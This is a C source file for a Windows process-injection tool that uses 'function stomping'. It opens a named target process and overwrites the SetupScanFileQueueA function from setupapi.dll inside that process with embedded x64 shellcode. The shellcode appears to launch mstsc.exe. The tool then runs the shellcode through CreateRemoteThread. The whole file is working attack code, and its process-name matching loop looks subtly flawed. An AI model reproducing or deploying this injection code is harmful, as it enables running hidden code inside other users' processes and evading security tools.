#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#pragma comment(linker, "/SUBSYSTEM:CONSOLE /ENTRY:wmainCRTStartup")

// Define the DLL and function to be used for the injection
#define SACRIFICAL_DLL          "setupapi.dll"
#define SACRIFICIAL_Function    "SetupScanFileQueueA"

// Define the payload to be injected
unsigned char Payload[] = 
{
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x6d\x73\x74\x73\x63\x2e\x65\x78\x65\x00"
};


// Description:
// Changes the memory protection, writes a payload, and updates memory protection for a specified process.
//
// Parameters:
// hProcess:       A handle to the target process.
// pAddress:       The address in the target process's memory where the payload will be written.
// pPayload:       A pointer to the payload data to be written.
// sPayloadSize:   The size, in bytes, of the payload data.
BOOL WriteStompingPayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwOldProtection = 0;
    SIZE_T sNumberBytesWritten = 0;

    // Step 1: Change permissions on the specified process memory to read/write.
    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtectEx Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Step 2: Write the payload into memory.
    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberBytesWritten) || sPayloadSize != sNumberBytesWritten) {
        printf("[-] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
        printf("Bytes Written At: %d of %d\n", sNumberBytesWritten, sPayloadSize);
        return FALSE;
    }

    // Step 3: Add permission to the specified process memory to have executable rights.
    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtectEx Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// Description:
// Retrieves the handle of a remote process by comparing process names.
//
// Parameters:
// szProcessname:  The name of the target process.
// dwProcessId:    A pointer to store the process ID of the target process.
// hProcess:       A pointer to store the handle of the target process.

BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32W Proc = { sizeof(PROCESSENTRY32W) };

    // Take a snapshot of the current running processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateToolHelp32Snapshot Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    } else {
        wprintf(L"[i] Snapshot Has been taken of current processes. \n");
    }

    // Retrieve information about the first process in the snapshot
    if (!Process32FirstW(hSnapshot, &Proc)) {
        wprintf(L"\n\t[!] Process32First Failed With Error: %d \n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    // Loop until there are no more processes in the snapshot
    do {
        // Maximum number of bytes to be stored in the LowerName array
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            // Fill a block of memory with 0's
            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            // Save the length of the executable name in the dwSize variable
            DWORD dwSize = lstrlenW(LowerName);
            DWORD i = 0;

             // Ensure the string is null-terminated
            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = L'\0';
            }

            

           // If dwSize (process name length) is not greater than MAX_PATH * 2
            if (dwSize < MAX_PATH * 2) {
                // Convert characters from uppercase to lowercase and store those values inside the LowerName variable
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(LowerName[i]);

                LowerName[i++] = L'\0';
            }
        }

        // Compare the enumerated process path with the user-provided process name; if identical, continue
        if (wcscmp(LowerName, szProcessName) == 0) {
            // Save the process ID and open a handle to the process
            *dwProcessId = Proc.th32ProcessID;
            
            // Open the process with full rights, not inheritable by the handle
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                wprintf(L"\n\t[!] OpenProcess Failed With Error: %d\n", GetLastError());
            CloseHandle(hSnapshot);
            return TRUE;
        }
    // Continue looping to find the specified process name
    } while (Process32NextW(hSnapshot, &Proc));

    CloseHandle(hSnapshot);

    // If the process with the specified name is not found, return FALSE
    return FALSE;
}


int wmain(int argc, wchar_t* argv[]) {
    HANDLE hProcess = NULL, hThread = NULL;
    PVOID pAddress = NULL;
    DWORD dwProcessId = 0;
    HMODULE hModule = NULL;

    if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}
    
    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        wprintf(L"[-] Process not Found\n");
        return -1;
    } else {
        wprintf(L"Target Process Found At: %d \n", dwProcessId);
    }

    wprintf(L"Loading %S ...\n", SACRIFICAL_DLL);
    hModule = LoadLibraryA(SACRIFICAL_DLL);
    if (hModule == NULL) {
        wprintf(L"[-] LoadLibrary Failed With Error %d \n", GetLastError());
        return -1;
    } else {
        wprintf(L"[i] DLL Loaded\n");
    }
    pAddress = GetProcAddress(hModule, SACRIFICIAL_Function);
    if (pAddress == NULL) {
        wprintf(L"[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return -1;
    }
    wprintf(L"[+] Address Of %s: 0x%p \n", SACRIFICIAL_Function, pAddress);

    wprintf(L"[#] Press <Enter> To Write Payload ... ");
    getchar();
    wprintf(L"[i] Writing ... ");
    if (!WriteStompingPayload(hProcess, pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    wprintf(L"[+] Payload Has been Written At: 0x%p\n", pAddress);

    wprintf(L"[#] Press <Enter> To Run The Payload ... ");
    getchar();

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    wprintf(L"[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
